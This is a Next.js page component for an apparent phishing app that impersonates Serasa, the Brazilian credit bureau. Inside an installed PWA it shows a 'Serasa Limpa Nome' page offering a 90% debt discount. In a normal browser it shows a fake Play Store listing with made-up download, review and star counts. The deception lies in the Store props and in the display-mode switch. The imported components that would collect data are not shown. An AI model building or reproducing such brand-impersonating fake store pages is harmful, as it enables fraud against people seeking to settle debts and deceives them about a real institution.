import { Serasa } from "@/components/serasa"
import { Store } from "@/components/store"
import Head from "next/head"
import { useEffect, useState } from "react"

export default function Home() {
  const [inPWA, setInPWA] = useState<boolean | null>(null)

  useEffect(() => {
    const mql = window.matchMedia("(display-mode: standalone)")

    const callback = (event: MediaQueryListEvent) => {
      if (event.matches) {
        setInPWA(true)
      } else {
        setInPWA(false)
      }
    }

    mql.addEventListener("change", callback)
    return () => {
      mql.removeEventListener("change", callback)
    }
  }, [])

  return inPWA ? (
    <>
      <Head>
        <title>Serasa Limpa Nome com 90% de desconto</title>
      </Head>

      <Serasa />
    </>
  ) : (
    <>
      <Head>
        <title>Serasa Limpa Nome - Play Store</title>
      </Head>

      <Store
        name="Serasa"
        store="App Serasa"
        icon="/serasa.png"
        downloads="150 mil"
        reviews="5k"
        size="15 MB"
        stars={4.9}
      />
    </>
  )
}
